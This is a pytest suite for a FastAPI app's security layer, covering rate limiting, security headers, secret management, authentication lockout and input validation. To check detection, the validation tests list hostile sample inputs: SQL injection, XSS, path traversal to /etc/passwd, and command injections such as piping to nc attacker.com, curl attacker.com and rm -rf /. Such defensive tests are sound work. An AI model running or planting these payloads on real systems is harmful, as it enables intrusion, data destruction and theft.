"""
Comprehensive security tests for all security measures implemented.
Tests authentication, input validation, rate limiting, headers, and secret management.
"""

import pytest
import asyncio
import time
import json
from typing import Dict, Any
from unittest.mock import Mock, patch, AsyncMock
from fastapi import FastAPI, Request, Response
from fastapi.testclient import TestClient
from starlette.websockets import WebSocket

from app.middleware.security_middleware import SecurityMiddleware, RateLimitTracker
from app.middleware.security_headers import SecurityHeadersMiddleware
from app.core.enhanced_secret_manager import EnhancedSecretManager, SecretAccessLevel, EnvironmentType
from app.core.enhanced_input_validation import EnhancedInputValidator, ValidationLevel, SecurityThreat
from app.auth.enhanced_auth_security import EnhancedAuthSecurity, AuthenticationResult
from app.core.exceptions import NetraSecurityException


class TestSecurityMiddleware:
    """Test security middleware functionality."""
    
    @pytest.fixture
    def security_middleware(self):
        """Create security middleware for testing."""
        rate_limiter = RateLimitTracker()
        return SecurityMiddleware(None, rate_limiter)
    
    @pytest.fixture
    def mock_request(self):
        """Create mock request for testing."""
        request = Mock(spec=Request)
        request.method = "POST"
        request.url.path = "/api/test"
        request.headers = {"content-length": "100", "user-agent": "test-agent"}
        request.client.host = "127.0.0.1"
        request.body = AsyncMock(return_value=b'{"test": "data"}')
        return request
    
    @pytest.mark.asyncio
    async def test_request_size_validation(self, security_middleware, mock_request):
        """Test request size validation."""
        # Test oversized request
        mock_request.headers = {"content-length": str(20 * 1024 * 1024)}  # 20MB
        
        with pytest.raises(Exception):  # Should raise HTTP 413
            await security_middleware._validate_request_size(mock_request)
    
    @pytest.mark.asyncio
    async def test_rate_limiting(self, security_middleware, mock_request):
        """Test rate limiting functionality."""
        # Simulate multiple requests from same IP
        for i in range(101):  # Exceed default limit of 100
            if i < 100:
                await security_middleware._check_rate_limits(mock_request)
            else:
                with pytest.raises(Exception):  # Should raise HTTP 429
                    await security_middleware._check_rate_limits(mock_request)
    
    @pytest.mark.asyncio
    async def test_input_validation(self, security_middleware, mock_request):
        """Test input validation for malicious content."""
        # Test SQL injection
        mock_request.body = AsyncMock(return_value=b'{"query": "SELECT * FROM users WHERE id = 1 OR 1=1"}')
        
        with pytest.raises(NetraSecurityException):
            await security_middleware._validate_request_body(mock_request)
        
        # Test XSS
        mock_request.body = AsyncMock(return_value=b'{"content": "<script>alert(\'xss\')</script>"}')
        
        with pytest.raises(NetraSecurityException):
            await security_middleware._validate_request_body(mock_request)
    
    def test_url_validation(self, security_middleware, mock_request):
        """Test URL validation."""
        # Test extremely long URL
        long_path = "a" * 3000
        mock_request.url.path = long_path
        mock_request.url.__str__ = lambda: f"http://example.com/{long_path}"
        
        with pytest.raises(Exception):  # Should raise HTTP 414
            security_middleware._validate_url(mock_request)
        
        # Test suspicious URL characters
        mock_request.url.__str__ = lambda: "http://example.com/<script>"
        
        with pytest.raises(Exception):  # Should raise HTTP 400
            security_middleware._validate_url(mock_request)
    
    def test_client_ip_extraction(self, security_middleware, mock_request):
        """Test client IP extraction from various headers."""
        # Test X-Forwarded-For
        mock_request.headers = {"x-forwarded-for": "192.168.1.1, 10.0.0.1"}
        mock_request.client.host = "127.0.0.1"
        
        ip = security_middleware._get_client_ip(mock_request)
        assert ip == "192.168.1.1"
        
        # Test fallback to client host
        mock_request.headers = {}
        ip = security_middleware._get_client_ip(mock_request)
        assert ip == "127.0.0.1"


class TestSecurityHeaders:
    """Test security headers middleware."""
    
    @pytest.fixture
    def security_headers_middleware(self):
        """Create security headers middleware for testing."""
        return SecurityHeadersMiddleware(None, "production")
    
    @pytest.fixture
    def mock_response(self):
        """Create mock response for testing."""
        response = Mock(spec=Response)
        response.headers = {}
        return response
    
    def test_production_headers(self, security_headers_middleware, mock_response):
        """Test production security headers."""
        security_headers_middleware._add_base_headers(mock_response)
        
        # Check critical security headers
        assert "Strict-Transport-Security" in mock_response.headers
        assert "Content-Security-Policy" in mock_response.headers
        assert "X-Frame-Options" in mock_response.headers
        assert "X-Content-Type-Options" in mock_response.headers
        assert "X-XSS-Protection" in mock_response.headers
        
        # Verify HSTS settings
        hsts = mock_response.headers["Strict-Transport-Security"]
        assert "max-age=31536000" in hsts
        assert "includeSubDomains" in hsts
    
    def test_csp_nonce_generation(self, security_headers_middleware):
        """Test CSP nonce generation and injection."""
        from app.middleware.security_headers import NonceGenerator
        
        # Test nonce generation
        nonce1 = NonceGenerator.generate_nonce()
        nonce2 = NonceGenerator.generate_nonce()
        
        assert len(nonce1) > 10  # Should be sufficiently long
        assert nonce1 != nonce2  # Should be unique
        
        # Test nonce injection into CSP
        original_csp = "script-src 'self'; style-src 'self'"
        updated_csp = NonceGenerator.add_nonce_to_csp(original_csp, nonce1)
        
        assert f"'nonce-{nonce1}'" in updated_csp
    
    def test_api_specific_headers(self, security_headers_middleware, mock_response):
        """Test API-specific security headers."""
        security_headers_middleware._add_api_headers(mock_response)
        
        assert mock_response.headers["Cache-Control"] == "no-store, no-cache, must-revalidate, private"
        assert "X-API-Version" in mock_response.headers
        assert "X-RateLimit-Limit" in mock_response.headers


class TestSecretManager:
    """Test enhanced secret manager."""
    
    @pytest.fixture
    def secret_manager(self):
        """Create secret manager for testing."""
        return EnhancedSecretManager(EnvironmentType.DEVELOPMENT)
    
    def test_environment_isolation(self, secret_manager):
        """Test environment-based secret isolation."""
        # Production manager should only access prod secrets
        prod_manager = EnhancedSecretManager(EnvironmentType.PRODUCTION)
        
        with pytest.raises(NetraSecurityException):
            prod_manager.get_secret("dev-api-key", "test-component")
    
    def test_secret_encryption(self, secret_manager):
        """Test secret encryption/decryption."""
        secret_name = "test-secret"
        secret_value = "super-secret-value"
        
        # Register secret
        secret_manager._register_secret(
            secret_name, 
            secret_value, 
            SecretAccessLevel.RESTRICTED
        )
        
        # Retrieve and verify
        retrieved_value = secret_manager.get_secret(secret_name, "test-component")
        assert retrieved_value == secret_value
    
    def test_access_control(self, secret_manager):
        """Test secret access control."""
        secret_name = "restricted-secret"
        secret_value = "restricted-value"
        
        secret_manager._register_secret(
            secret_name, 
            secret_value, 
            SecretAccessLevel.CRITICAL
        )
        
        # Test max attempts
        for i in range(6):  # Exceed max attempts (5)
            try:
                secret_manager.get_secret("non-existent", "bad-component")
            except NetraSecurityException:
                pass
        
        # Component should now be blocked
        with pytest.raises(NetraSecurityException) as exc_info:
            secret_manager.get_secret(secret_name, "bad-component")
        
        assert "blocked" in str(exc_info.value).lower()
    
    def test_secret_rotation(self, secret_manager):
        """Test secret rotation functionality."""
        secret_name = "rotatable-secret"
        original_value = "original-value"
        new_value = "new-value"
        
        # Register secret
        secret_manager._register_secret(
            secret_name, 
            original_value, 
            SecretAccessLevel.INTERNAL
        )
        
        # Rotate secret
        success = secret_manager.rotate_secret(secret_name, new_value)
        assert success
        
        # Verify new value
        retrieved_value = secret_manager.get_secret(secret_name, "test-component")
        assert retrieved_value == new_value
    
    def test_security_metrics(self, secret_manager):
        """Test security metrics collection."""
        metrics = secret_manager.get_security_metrics()
        
        assert "total_secrets" in metrics
        assert "secrets_by_access_level" in metrics
        assert "secrets_needing_rotation" in metrics
        assert "blocked_components" in metrics


class TestInputValidation:
    """Test enhanced input validation."""
    
    @pytest.fixture
    def validator(self):
        """Create input validator for testing."""
        return EnhancedInputValidator(ValidationLevel.STRICT)
    
    def test_sql_injection_detection(self, validator):
        """Test SQL injection detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin'/*",
            "UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_input(malicious_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.SQL_INJECTION in result.threats_detected
    
    def test_xss_detection(self, validator):
        """Test XSS detection."""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for xss_input in xss_inputs:
            result = validator.validate_input(xss_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.XSS in result.threats_detected
    
    def test_path_traversal_detection(self, validator):
        """Test path traversal detection."""
        traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for traversal_input in traversal_inputs:
            result = validator.validate_input(traversal_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.PATH_TRAVERSAL in result.threats_detected
    
    def test_command_injection_detection(self, validator):
        """Test command injection detection."""
        command_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test `curl attacker.com`",
            "test $(whoami)"
        ]
        
        for command_input in command_inputs:
            result = validator.validate_input(command_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.COMMAND_INJECTION in result.threats_detected
    
    def test_input_sanitization(self, validator):
        """Test input sanitization."""
        malicious_input = "<script>alert('xss')</script>"
        result = validator.validate_input(malicious_input, "test_field")
        
        # Should be sanitized even if invalid
        assert result.sanitized_value != malicious_input
        assert "<script>" not in result.sanitized_value
    
    def test_context_validation(self, validator):
        """Test context-specific validation."""
        # Email validation
        email_result = validator.validate_input(
            "invalid-email", 
            "email_field", 
            {"type": "email"}
        )
        assert "email" in email_result.warnings[0].lower()
        
        # URL validation
        url_result = validator.validate_input(
            "javascript:alert('xss')", 
            "url_field", 
            {"type": "url"}
        )
        assert not url_result.is_valid
        
        # Filename validation
        filename_result = validator.validate_input(
            "../../../etc/passwd", 
            "filename_field", 
            {"type": "filename"}
        )
        assert not filename_result.is_valid


class TestEnhancedAuthentication:
    """Test enhanced authentication security."""
    
    @pytest.fixture
    def auth_security(self):
        """Create authentication security for testing."""
        return EnhancedAuthSecurity()
    
    def test_successful_authentication(self, auth_security):
        """Test successful authentication flow."""
        result, session_id = auth_security.authenticate_user(
            "test_user", 
            "valid_password123", 
            "127.0.0.1", 
            "Mozilla/5.0 Test Agent"
        )
        
        assert result == AuthenticationResult.SUCCESS
        assert session_id is not None
        assert len(session_id) > 20  # Should be sufficiently long
    
    def test_failed_authentication(self, auth_security):
        """Test failed authentication handling."""
        result, session_id = auth_security.authenticate_user(
            "test_user", 
            "wrong_password", 
            "127.0.0.1", 
            "Mozilla/5.0 Test Agent"
        )
        
        assert result == AuthenticationResult.FAILED
        assert session_id is None
    
    def test_rate_limiting_by_ip(self, auth_security):
        """Test IP-based rate limiting."""
        ip_address = "192.168.1.100"
        
        # Make multiple failed attempts
        for i in range(11):  # Exceed rate limit
            result, _ = auth_security.authenticate_user(
                f"user_{i}", 
                "wrong_password", 
                ip_address, 
                "Mozilla/5.0 Test Agent"
            )
            
            if i < 10:
                assert result == AuthenticationResult.FAILED
            else:
                assert result == AuthenticationResult.BLOCKED
    
    def test_user_lockout(self, auth_security):
        """Test user lockout after max failed attempts."""
        user_id = "lockout_test_user"
        
        # Make multiple failed attempts for same user
        for i in range(6):  # Exceed max failed attempts (5)
            result, _ = auth_security.authenticate_user(
                user_id, 
                "wrong_password", 
                f"192.168.1.{i}", 
                "Mozilla/5.0 Test Agent"
            )
            
            if i < 5:
                assert result == AuthenticationResult.FAILED
            else:
                assert result == AuthenticationResult.BLOCKED
    
    def test_session_validation(self, auth_security):
        """Test session validation with security checks."""
        # Create session
        result, session_id = auth_security.authenticate_user(
            "session_test_user", 
            "valid_password123", 
            "127.0.0.1", 
            "Mozilla/5.0 Test Agent"
        )
        
        assert result == AuthenticationResult.SUCCESS
        
        # Validate session with same IP/UA
        valid, error = auth_security.validate_session(
            session_id, 
            "127.0.0.1", 
            "Mozilla/5.0 Test Agent"
        )
        assert valid
        assert error is None
        
        # Validate session with different IP (should be suspicious)
        valid, error = auth_security.validate_session(
            session_id, 
            "10.0.0.1", 
            "Mozilla/5.0 Test Agent"
        )
        # Session might still be valid but flagged as suspicious
        session = auth_security.active_sessions.get(session_id)
        if session:
            assert "ip_mismatch" in session.security_flags.get("security_issues", [])
    
    def test_concurrent_session_limits(self, auth_security):
        """Test concurrent session limits."""
        user_id = "concurrent_test_user"
        sessions = []
        
        # Create multiple sessions (should be limited)
        for i in range(5):  # Try to exceed max concurrent sessions (3)
            result, session_id = auth_security.authenticate_user(
                user_id, 
                "valid_password123", 
                f"192.168.1.{i}", 
                f"Mozilla/5.0 Test Agent {i}"
            )
            
            if result == AuthenticationResult.SUCCESS:
                sessions.append(session_id)
        
        # Should not have more than max concurrent sessions
        active_user_sessions = [
            s for s in auth_security.active_sessions.values() 
            if s.user_id == user_id and s.status.value == "active"
        ]
        assert len(active_user_sessions) <= auth_security.max_concurrent_sessions
    
    def test_security_metrics(self, auth_security):
        """Test security metrics collection."""
        # Generate some activity
        auth_security.authenticate_user("user1", "password", "127.0.0.1", "agent")
        auth_security.authenticate_user("user2", "wrong", "127.0.0.1", "agent")
        
        metrics = auth_security.get_security_status()
        
        assert "active_sessions" in metrics
        assert "blocked_ips" in metrics
        assert "metrics" in metrics
        assert "security_score" in metrics["metrics"]


class TestIntegratedSecurity:
    """Test integrated security across all components."""
    
    @pytest.fixture
    def app_with_security(self):
        """Create FastAPI app with all security middleware."""
        app = FastAPI()
        
        # Add security middleware
        security_middleware = SecurityMiddleware(app)
        headers_middleware = SecurityHeadersMiddleware(app, "development")
        
        @app.post("/api/test")
        async def test_endpoint(data: dict):
            return {"status": "success", "data": data}
        
        return app
    
    def test_end_to_end_security(self, app_with_security):
        """Test end-to-end security with all middleware."""
        client = TestClient(app_with_security)
        
        # Test normal request
        response = client.post("/api/test", json={"test": "data"})
        assert response.status_code == 200
        
        # Check security headers are present
        assert "X-Content-Type-Options" in response.headers
        assert "X-Frame-Options" in response.headers
        
        # Test malicious request (should be blocked)
        with pytest.raises(Exception):
            client.post("/api/test", json={"query": "'; DROP TABLE users; --"})
    
    @pytest.mark.asyncio
    async def test_performance_under_load(self, app_with_security):
        """Test security performance under load."""
        client = TestClient(app_with_security)
        
        # Simulate concurrent requests
        async def make_request():
            return client.post("/api/test", json={"test": "data"})
        
        start_time = time.time()
        
        # Make 100 concurrent requests
        tasks = [make_request() for _ in range(100)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        
        # Should complete within reasonable time
        assert end_time - start_time < 10  # 10 seconds max
        
        # Most requests should succeed
        successful_responses = [r for r in responses if hasattr(r, 'status_code') and r.status_code == 200]
        assert len(successful_responses) > 90  # At least 90% success rate


class TestSecurityConfiguration:
    """Test security configuration and environment handling."""
    
    def test_environment_specific_config(self):
        """Test environment-specific security configuration."""
        from app.middleware.security_headers import SecurityHeadersConfig
        
        # Production config should be strictest
        prod_headers = SecurityHeadersConfig.get_headers("production")
        assert "Strict-Transport-Security" in prod_headers
        assert "max-age=31536000" in prod_headers["Strict-Transport-Security"]
        
        # Development config should be more permissive
        dev_headers = SecurityHeadersConfig.get_headers("development")
        dev_csp = dev_headers["Content-Security-Policy"]
        assert "'unsafe-inline'" in dev_csp
        assert "'unsafe-eval'" in dev_csp
    
    def test_secret_environment_isolation(self):
        """Test secret manager environment isolation."""
        # Development manager
        dev_manager = EnhancedSecretManager(EnvironmentType.DEVELOPMENT)
        
        # Production manager  
        prod_manager = EnhancedSecretManager(EnvironmentType.PRODUCTION)
        
        # Each should only access appropriate secrets
        assert dev_manager.environment == EnvironmentType.DEVELOPMENT
        assert prod_manager.environment == EnvironmentType.PRODUCTION
        
        # Cross-environment access should be blocked
        with pytest.raises(NetraSecurityException):
            prod_manager.get_secret("dev-test-secret", "test-component")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])